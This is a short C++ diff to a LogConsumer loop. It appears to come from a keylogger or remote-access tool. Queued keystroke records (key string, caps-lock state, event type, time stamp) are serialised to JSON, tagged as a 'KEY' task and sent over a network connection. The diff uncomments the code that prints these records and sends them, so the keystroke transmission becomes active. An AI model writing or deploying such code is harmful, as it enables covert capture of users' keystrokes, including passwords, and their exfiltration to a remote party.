@@ -26,8 +26,7 @@ void LogConsumer::loop(std::stop_token st)
             j["eventType"] = log_q.front().eventType;
             j["keyString"] = log_q.front().keyString;
             log_q.pop();
-        }
-        /*
+        } 
         std::cout << j["timeStamp"] << "\n";
         std::cout << j["capsLock"] << "\n";
         std::cout << j["eventType"] << "\n";
@@ -38,8 +37,7 @@ void LogConsumer::loop(std::stop_token st)
         resp["taskType"] = "KEY";
         resp["payload"] = json::serialize(j);
 
-        conn_->send(json::serialize(resp));
-        */
+        conn_->send(json::serialize(resp)); 
     }
 }
 
